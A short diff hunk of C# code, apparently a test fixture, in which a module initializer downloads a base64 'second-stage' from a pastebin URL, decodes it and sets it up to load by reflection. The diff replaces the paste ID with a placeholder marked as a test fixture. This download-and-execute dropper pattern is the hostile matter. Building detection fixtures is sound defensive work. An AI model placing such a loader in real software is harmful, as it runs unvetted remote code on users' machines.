@@ -38,7 +38,7 @@ internal static class ModuleInitializer
 
         // Pull a base64-encoded second-stage from a "harmless" host.
         var client = new HttpClient();
-        var encoded = await client.GetStringAsync("https://pastebin.com/raw/abc123");
+        var encoded = await client.GetStringAsync("https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste");
         var bytes = Convert.FromBase64String(encoded);
 
         // Persist it to disk and load via reflection — the canonical
